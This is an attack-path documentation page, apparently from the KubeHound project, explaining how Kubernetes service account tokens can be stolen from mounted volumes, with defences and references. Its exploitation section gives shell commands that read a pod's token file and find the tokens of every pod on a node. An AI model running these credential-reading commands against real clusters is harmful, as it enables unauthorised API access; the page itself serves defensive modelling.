---
title: TOKEN_STEAL
---

<!--
id: TOKEN_STEAL
name: "Steal service account token from volume"
mitreAttackTechnique: T1552 - Unsecured Credentials
mitreAttackTactic: TA0006 - Credential Access
-->

# TOKEN_STEAL

| Source                                    | Destination                           | MITRE                            |
| ----------------------------------------- | ------------------------------------- |----------------------------------|
| [Volume](../entities/volume.md) | [Identity](../entities/identity.md) | [Unsecured Credentials, T1552](https://attack.mitre.org/techniques/T1552/) |

This attack represents the ability to steal a K8s API token from an accessible volume.

## Details

An attacker with access to a pod with an automounted serviceaccount token (the default behaviour) can steal the serviceaccount access token to perform actions in the K8s API. More significantly if an attacker is able to access all or part of the K8s node filesystem e.g via a `hostPath` mount, an attacker could retrieve the service account tokens for ALL pods running on the node. This attack is possible from access to a container or node and each case is discussed separately throughout.

## Prerequisites

### Container

+ A service account token mounted into the container via a projected volume (default behaviour).

### Node

+ Access to a K8s node filesystem (`/var/lib/kubelet/pods` or any parent directory)

## Checks

### Container

Check whether a serviceaccount token is automounted:

```bash
ls -la /var/run/secrets/kubernetes.io/
ls -la /run/secrets/kubernetes.io/
```

Check whether a host volume mount provides access to other pods' tokens:

```bash
ls -la /<HOST MOUNT>/var/lib/kubelet/pods/
```
 
[KDigger](https://github.com/quarkslab/kdigger#token) can also help with this.

### Node

Confirm access to the location of pod tokens:

```bash
ls -la /var/lib/kubelet/pods/
```

## Exploitation

See [IDENTITY_ASSUME](./IDENTITY_ASSUME.md#exploitation) for how to use a captured token.

### Container

From within a container read the service account token mounted in the default location:

```bash
cat /run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### Node

Steal access tokens for ALL pods running on the node:

```bash
 find /var/lib/kubelet/pods/ -name token -type l 2>/dev/null
# /var/lib/kubelet/pods/5a9fc508-8410-444a-bf63-9f11e5979bee/volumes/kubernetes.io~projected/kube-api-access-225d6/token
# /var/lib/kubelet/pods/a1176593-34a2-43e6-8bdd-ed10fa148fe7/volumes/kubernetes.io~projected/kube-api-access-ng6px/token
# /var/lib/kubelet/pods/10b90d62-6b16-4aa7-9e72-75f18dcca5a8/volumes/kubernetes.io~projected/kube-api-access-j7dsp/token
# /var/lib/kubelet/pods/dfbf38ad-2e92-44e0-b05
```

## Defences

### Monitoring

+ Monitor for access to well-known K8s secrets paths from unusual processes.

### Prevent service account token automounting

When a pod is being created, it automatically mounts a service account (the default is default service account in the same namespace). Not every pod needs the ability to access the API from within itself.

From version 1.6+ it is possible to prevent *automounting* of serviceaccount tokens on pods using:

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: sa1
automountServiceAccountToken: false
```

## Calculation

+ [TokenSteal](https://github.com/DataDog/KubeHound/tree/main/pkg/kubehound/graph/edge/token_steal.go)

## References:

+ [The Path Less Traveled: Abusing Kubernetes Defaults (Video)](https://www.youtube.com/watch?v=HmoVSmTIOxM)
+ [The Path Less Traveled: Abusing Kubernetes Defaults (GitHub)](https://github.com/mauilion/blackhat-2019)
+ [Securing Kubernetes Clusters by Eliminating Risky Permissions](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
